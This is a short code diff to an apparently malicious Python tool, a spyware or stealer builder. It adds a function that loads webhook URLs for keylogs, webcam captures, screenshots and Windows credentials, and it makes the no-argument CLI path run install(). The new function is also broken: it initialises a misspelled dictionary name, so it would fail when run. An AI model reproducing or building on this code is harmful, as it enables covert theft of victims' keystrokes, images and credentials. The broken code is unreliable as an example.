@@ -120,6 +120,23 @@ def read_config(config_file):
 
     return configuration
 
+# gets webhooks
+def get_webhooks():
+    # dicitonary for output
+    webhoooks = {}
+
+    # read webhook logs
+    webhook_log = open("webhooks.log", "r").readlines()
+
+    # assign webhook to value
+    webhooks["KEYLOG"] = webhook_log[0].strip()
+    webhooks["WEBCAM"] = webhook_log[1].strip()
+    webhooks["SCREEN"] = webhook_log[2].strip()
+    webhooks["WCREDS"] = webhook_log[3].strip()
+
+    # reutnr data
+    return webhooks
+
 # display configuration file data
 def print_config(configuration):
 
@@ -137,7 +154,7 @@ def exit():
 
 # gets current date and time
 def current_date():
-    current = datetime.now()
+    current = datetime.now()    
 
     return current.strftime("%m-%d-%Y_%H-%M-%S")
 
@@ -337,10 +354,6 @@ def remove():
     if option == "n":
         main()
 
-# listener
-def listener():
-    pass
-
 # command line interface
 def cli(arguments):
     # display banner
@@ -496,7 +509,9 @@ def cli(arguments):
 
     # if arguments don't exist
     else:
-        print(help_menu)
+        # TODO: install webhooks
+        install()
+        # print(help_menu)
 
 # main code
 def main():
